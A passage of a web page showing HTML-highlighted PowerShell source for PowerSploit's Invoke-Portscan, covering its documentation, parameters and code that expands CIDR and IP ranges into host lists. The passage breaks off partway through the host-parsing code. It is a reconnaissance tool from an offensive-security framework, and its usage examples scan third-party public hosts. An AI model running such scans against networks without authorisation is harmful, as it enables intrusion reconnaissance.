class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Invoke-Portscan</span></span><br>&#123;<br><span class="hljs-comment">&lt;#</span><br><span class="hljs-comment"><span class="hljs-doctag">.SYNOPSIS</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Simple portscan module</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PowerSploit Function: Invoke-Portscan</span><br><span class="hljs-comment">Author: Rich Lundeen (http://webstersProdigy.net)</span><br><span class="hljs-comment">License: BSD 3-Clause</span><br><span class="hljs-comment">Required Dependencies: None</span><br><span class="hljs-comment">Optional Dependencies: None</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.DESCRIPTION</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Does a simple port scan using regular sockets, based (pretty) loosely on nmap</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Hosts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Include these comma seperated hosts (supports IPv4 CIDR notation) or pipe them in</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER HostFile</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Input hosts from file rather than commandline</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER ExcludeHosts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Exclude these comma seperated hosts</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Ports</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Include these comma seperated ports (can also be a range like 80-90)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER PortFile</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Input ports from a file</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER TopPorts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Include the x top ports - only goes to 1000, default is top 50</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER ExcludedPorts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Exclude these comma seperated ports</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER SkipDiscovery</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Treat all hosts as online, skip host discovery</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER PingOnly</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Ping scan only (disable port scan)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER DiscoveryPorts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Comma separated ports used for host discovery. -1 is a ping</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Threads</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">number of max threads for the thread pool (per host)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER nHosts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">number of hosts to concurrently scan</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Timeout</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Timeout time on a connection in miliseconds before port is declared filtered</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER SleepTimer</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Wait before thread checking, in miliseconds</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER SyncFreq</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">How often (in terms of hosts) to sync threads and flush output</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER T</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">[0-5] shortcut performance options. Default is 3. higher is more aggressive. Sets (nhosts, threads,timeout)</span><br><span class="hljs-comment">    5 &#123;$nHosts=30;  $Threads = 1000; $Timeout = 750  &#125;</span><br><span class="hljs-comment">    4 &#123;$nHosts=25;  $Threads = 1000; $Timeout = 1200 &#125;</span><br><span class="hljs-comment">    3 &#123;$nHosts=20;  $Threads = 100;  $Timeout = 2500 &#125;</span><br><span class="hljs-comment">    2 &#123;$nHosts=15;  $Threads = 32;   $Timeout = 3000 &#125;</span><br><span class="hljs-comment">    1 &#123;$nHosts=10;  $Threads = 32;   $Timeout = 5000 &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER GrepOut</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Greppable output file</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER XmlOut</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">output XML file</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER ReadableOut</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">output file in &#x27;readable&#x27; format</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER AllformatsOut</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">output in readable (.nmap), xml (.xml), and greppable (.gnmap) formats</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER noProgressMeter</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Suppresses the progress meter</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER quiet</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">supresses returned output and don&#x27;t store hosts in memory - useful for very large scans</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER ForceOverwrite</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Force Overwrite if output Files exist. Otherwise it throws exception</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Invoke-Portscan -Hosts &quot;webstersprodigy.net,google.com,microsoft.com&quot; -TopPorts 50</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Description</span><br><span class="hljs-comment">-----------</span><br><span class="hljs-comment">Scans the top 50 ports for hosts found for webstersprodigy.net,google.com, and microsoft.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">echo webstersprodigy.net | Invoke-Portscan -oG test.gnmap -f -ports &quot;80,443,8080&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Description</span><br><span class="hljs-comment">-----------</span><br><span class="hljs-comment">Does a portscan of &quot;webstersprodigy.net&quot;, and writes a greppable output file</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25 -oA localnet</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Description</span><br><span class="hljs-comment">-----------</span><br><span class="hljs-comment">Scans the top 20 ports for hosts found in the 192.168.1.1/24 range, outputs all file formats</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.LINK</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">http://webstersprodigy.net</span><br><span class="hljs-comment">#&gt;</span><br><br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSUseShouldProcessForStateChangingFunctions&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSUseSingularNouns&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSUseApprovedVerbs&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSShouldProcess&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSUseLiteralInitializerForHashtable&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    <span class="hljs-function">[<span class="hljs-type">CmdletBinding</span>()]</span><br>    <span class="hljs-keyword">Param</span> (<br>        <span class="hljs-comment">#Host, Ports</span><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;cmdHosts&quot;</span>,<br><br>                   <span class="hljs-type">ValueFromPipeline</span>=<span class="hljs-variable">$True</span>,<br>                   <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)]<br>                   [<span class="hljs-built_in">String</span>[]] <span class="hljs-variable">$Hosts</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;fHosts&quot;</span>,<br>                   <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;iL&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>]  <span class="hljs-variable">$HostFile</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;exclude&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$ExcludeHosts</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;p&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$Ports</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;iP&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$PortFile</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$TopPorts</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;xPorts&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$ExcludedPorts</span>,<br><br>        <span class="hljs-comment">#Host Discovery</span><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;Pn&quot;</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$SkipDiscovery</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;sn&quot;</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$PingOnly</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;PS&quot;</span>)]<br>                   [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$DiscoveryPorts</span> = <span class="hljs-string">&quot;-1,445,80,443&quot;</span>,<br><br>        <span class="hljs-comment">#Timing and Performance</span><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$Threads</span> = <span class="hljs-number">100</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$nHosts</span> = <span class="hljs-number">25</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">2000</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$SleepTimer</span> = <span class="hljs-number">500</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$SyncFreq</span> = <span class="hljs-number">1024</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$T</span>,<br><br>        <span class="hljs-comment">#Output</span><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;oG&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$GrepOut</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;oX&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$XmlOut</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;oN&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$ReadableOut</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;oA&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$AllformatsOut</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$noProgressMeter</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;q&quot;</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$quiet</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;F&quot;</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$ForceOverwrite</span><br><br>        <span class="hljs-comment">#TODO add script parameter</span><br>        <span class="hljs-comment">#TODO add resume parameter</span><br>    )<br><br>    <span class="hljs-keyword">PROCESS</span> &#123;<br><br>        <span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2.0</span><br><br>        <span class="hljs-variable">$version</span> = .<span class="hljs-number">13</span><br>        <span class="hljs-variable">$hostList</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br>        <span class="hljs-variable">$portList</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br>        <span class="hljs-variable">$hostPortList</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br><br>        <span class="hljs-variable">$scannedHostList</span> = <span class="hljs-selector-tag">@</span>()<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Parse-Hosts</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$Hosts</span><br>            )<br><br>            [<span class="hljs-built_in">String</span>[]] <span class="hljs-variable">$iHosts</span> = <span class="hljs-variable">$Hosts</span>.Split(<span class="hljs-string">&quot;,&quot;</span>)<br><br>            <span class="hljs-variable">$IPRangeRegex</span> = <span class="hljs-string">&quot;\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;-\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;&quot;</span><br><br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$iHost</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$iHosts</span>)<br>            &#123;<br>                <span class="hljs-variable">$iHost</span> = <span class="hljs-variable">$iHost</span>.Replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>                <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$iHost</span>)<br>                &#123;<br>                    <span class="hljs-keyword">continue</span><br>                &#125;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$iHost</span>.contains(<span class="hljs-string">&quot;/&quot;</span>))<br>                &#123;<br>                    <span class="hljs-variable">$netPart</span> = <span class="hljs-variable">$iHost</span>.split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">0</span>]<br>                    [<span class="hljs-type">uint32</span>]<span class="hljs-variable">$maskPart</span> = <span class="hljs-variable">$iHost</span>.split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">1</span>]<br><br>                    <span class="hljs-variable">$address</span> = [<span class="hljs-type">System.Net.IPAddress</span>]::Parse(<span class="hljs-variable">$netPart</span>)<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$maskPart</span> <span class="hljs-operator">-ge</span> <span class="hljs-variable">$address</span>.GetAddressBytes().Length * <span class="hljs-number">8</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Bad host mask&quot;</span><br>                    &#125;<br><br>                    <span class="hljs-variable">$numhosts</span> = [<span class="hljs-type">System.math</span>]::Pow(<span class="hljs-number">2</span>,((<span class="hljs-variable">$address</span>.GetAddressBytes().Length *<span class="hljs-number">8</span>) - <span class="hljs-variable">$maskPart</span>))<br><br>                    <span class="hljs-variable">$startaddress</span> = <span class="hljs-variable">$address</span>.GetAddressBytes()<br>                    [<span class="hljs-built_in">array</span>]::Reverse(<span class="hljs-variable">$startaddress</span>)<br><br>                    <span class="hljs-variable">$startaddress</span> = [<span class="hljs-type">System.BitConverter</span>]::ToUInt32(<span class="hljs-variable">$startaddress</span>, <span class="hljs-number">0</span>)<br>                    [<span class="hljs-type">uint32</span>]<span class="hljs-variable">$startMask</span> = ([<span class="hljs-type">System.math</span>]::Pow(<span class="hljs-number">2</span>, <span class="hljs-variable">$maskPart</span>)<span class="hljs-literal">-1</span>) * ([<span class="hljs-type">System.Math</span>]::Pow(<span class="hljs-number">2</span>,(<span class="hljs-number">32</span> - <span class="hljs-variable">$maskPart</span>)))<br>                    <span class="hljs-variable">$startAddress</span> = <span class="hljs-variable">$startAddress</span> <span class="hljs-operator">-band</span> <span class="hljs-variable">$startMask</span><br><br>                    <span class="hljs-comment">#in powershell 2.0 there are 4 0 bytes padded, so the [0..3] is necessary</span><br>                    <span class="hljs-variable">$startAddress</span> = [<span class="hljs-type">System.BitConverter</span>]::GetBytes(<span class="hljs-variable">$startaddress</span>)[<span class="hljs-number">0</span><span class="hljs-type">..3</span>]<br>                    [<span class="hljs-built_in">array</span>]::Reverse(<span class="hljs-variable">$startaddress</span>)<br><br>                    <span class="hljs-variable">$address</span> = [<span class="hljs-type">System.Net.IPAddress</span>] [<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$startAddress</span><br><br>                    <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$address</span>.IPAddressToString)<br><br>                    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$numhosts</span><span class="hljs-literal">-1</span>; <span class="hljs-variable">$i</span>++)<br>                    &#123;<br><br>                        <span class="hljs-variable">$nextAddress</span> =  <span class="hljs-variable">$address</span>.GetAddressBytes()<br>                        [<span class="hljs-built_in">array</span>]::Reverse(<span class="hljs-variable">$nextAddress</span>)<br>                        <span class="hljs-variable">$nextAddress</span> =  [<span class="hljs-type">System.BitConverter</span>]::ToUInt32(<span class="hljs-variable">$nextAddress</span>, <span class="hljs-number">0</span>)<br>                        <span class="hljs-variable">$nextAddress</span> ++<br>                        <span class="hljs-variable">$nextAddress</span> = [<span class="hljs-type">System.BitConverter</span>]::GetBytes(<span class="hljs-variable">$nextAddress</span>)[<span class="hljs-number">0</span><span class="hljs-type">..3</span>]<br>                        [<span class="hljs-built_in">array</span>]::Reverse(<span class="hljs-variable">$nextAddress</span>)<br><br>                        <span class="hljs-variable">$address</span> = [<span class="hljs-type">System.Net.IPAddress</span>] [<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$nextAddress</span><br>                        <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$address</span>.IPAddressToString)<br><br>                    &#125;<br><br>                &#125;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$iHost</span> <span class="hljs-operator">-match</span> <span class="hljs-variable">$IPRangeRegex</span>)<br>                &#123;<br><br>                <span class="hljs-variable">$iHostPart1</span> = (<span class="hljs-variable">$iHost</span>.Split(<span class="hljs-string">&quot;-&quot;</span>))[<span class="hljs-number">0</span>]<br>                <span class="hljs-variable">$iHostPart2</span> = (<span class="hljs-variable">$iHost</span>.Split(<span class="hljs-string">&quot;-&quot;</span>))[<span class="hljs-number">1</span>]<br><br>                <span class="hljs-variable">$LowerBound</span> = <span class="hljs-variable">$iHostPart1</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)<br>                <span class="hljs-variable">$UpperBound</span> = <span class="hljs-variable">$iHostPart2</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)<br><br>                <span class="hljs-variable">$LowerBoundInt</span> = (<span class="hljs-variable">$LowerBound</span>[<span class="hljs-number">0</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$LowerBound</span>[<span class="hljs-number">1</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$LowerBound</span>[<span class="hljs-number">2</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$LowerBound</span>[<span class="hljs-number">3</span>].ToInt32(<span class="hljs-variable">$null</span>))<br>                <span class="hljs-variable">$UpperBoundInt</span> = (<span class="hljs-variable">$UpperBound</span>[<span class="hljs-number">0</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$UpperBound</span>[<span class="hljs-number">1</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$UpperBound</span>[<span class="hljs-number">2</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$UpperBound</span>[<span class="hljs-number">3</span>].ToInt32(<span class="hljs-variable">$null</span>))<br><br>                <span class="hljs-variable">$CurrentIP</span> = <span class="hljs-variable">$LowerBoundInt</span><br>                <span class="hljs-variable">$CurrentIPString</span> = <span class="hljs-variable">$null</span><br>                <span class="hljs-variable">$ControlArray</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br><br>                <span class="hljs-variable">$null</span> = <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$iHostPart1</span>)<br><br>                    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$CurrentIPString</span> <span class="hljs-operator">-ne</span> <span class="hljs-variable">$iHostPart2</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> <span class="hljs-operator">-lt</span> <span class="hljs-number">4</span>;<span class="hljs-variable">$i</span>++)<br>                        &#123;<br><br>                            <span class="hljs-keyword">if</span>((<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>] <span class="hljs-operator">-eq</span> <span class="hljs-variable">$UpperBoundInt</span>[<span class="hljs-variable">$i</span>]) <span class="hljs-operator">-and</span> ((<span class="hljs-variable">$i</span> <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>) <span class="hljs-operator">-or</span> <span class="hljs-variable">$ControlArray</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>] <span class="hljs-operator">-eq</span> <span class="hljs-number">1</span>))<br>                            &#123;<br>                                <span class="hljs-variable">$ControlArray</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-number">1</span><br>                                <span class="hljs-keyword">continue</span><br>                            &#125;<br>                            <span class="hljs-keyword">else</span><br>                            &#123;<br><br>                                <span class="hljs-variable">$Max</span> = <span class="hljs-number">254</span><br>                                <span class="hljs-keyword">if</span>((<span class="hljs-variable">$i</span> <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>) <span class="hljs-operator">-and</span> (<span class="hljs-variable">$ControlArray</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>] <span class="hljs-operator">-eq</span> <span class="hljs-number">1</span>))<br>                                &#123;<br>                                    <span class="hljs-variable">$Max</span> = <span class="hljs-variable">$UpperBoundInt</span>[<span class="hljs-variable">$i</span>]<br>                                &#125;<br><br>                                <span class="hljs-keyword">if</span>((<span class="hljs-variable">$i</span> <span class="hljs-operator">-ne</span> <span class="hljs-number">3</span>) <span class="hljs-operator">-and</span> (<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>] <span class="hljs-operator">-eq</span> <span class="hljs-number">254</span>))<br>                                &#123;<br>                                    <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>]++<br>                                    <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>]=<span class="hljs-number">0</span><br><br>                                    <span class="hljs-variable">$CurrentIPString</span> = (<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">0</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">1</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">2</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">3</span>].ToString())<br>                                    <span class="hljs-variable">$null</span> = <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$CurrentIPString</span>)<br>                                &#125;<br><br>                                <span class="hljs-keyword">if</span>((<span class="hljs-variable">$i</span> <span class="hljs-operator">-eq</span> <span class="hljs-number">3</span>) <span class="hljs-operator">-and</span> (<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>] <span class="hljs-operator">-lt</span> <span class="hljs-variable">$Max</span>))<br>                                &#123;<br>                                    <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>]++<br><br>                                    <span class="hljs-variable">$CurrentIPString</span> = (<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">0</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">1</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">2</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">3</span>].ToString())<br>                                    <span class="hljs-variable">$null</span> = <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$CurrentIPString</span>)<br>                                &#125;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br><br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-variable">$hostList</span>.Add(<span 